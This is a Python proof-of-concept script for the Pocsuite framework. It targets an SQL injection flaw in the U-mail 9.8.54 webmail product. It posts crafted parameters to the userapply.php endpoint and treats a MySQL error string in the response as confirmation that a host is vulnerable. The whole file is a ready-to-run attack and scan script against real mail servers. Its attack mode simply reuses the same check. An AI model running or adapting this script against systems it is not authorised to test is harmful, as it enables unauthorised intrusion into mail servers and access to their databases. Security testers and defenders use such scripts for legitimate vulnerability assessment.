#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import requests
headers = {'user-agent': 'ceshi/0.0.1','content-type': 'text/xml',}
def poc(url):
    if not url.startswith("http"):
            url = "http://" + url
    if "/" in url:
            url += 'webmail/userapply.php?execadd=333&DomainID=111'
    try:
        res = requests.post(url, verify=False, timeout=5, headers=headers)
        response = res.text
    except Exception:
        response = ""
    return response

class TestPOC(POCBase):
    name = 'U-mail--SQL Injection Attack'
    vulID = ''
    author = ['black']
    vulType = 'SQL Injection Attack'
    version = '1.0'    # default version: 1.0
    references = ['https://www.seebug.org/vuldb/ssvid-89058']
    desc = '''
		   u-mail未对用户输入参数过滤完全导致sql注入。
		   '''
    vulDate = ''
    createDate = '2020-02-07'
    updateDate = '2020-02-07'
    appName = 'U-mail'
    appVersion = '9.8.54'
    appPowerLink = ''
    samples = ['']
    
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        response = poc(self.url)
        if 'MySQL result re' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+ 'SQL Injection Attack' + ' is exist!'
        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)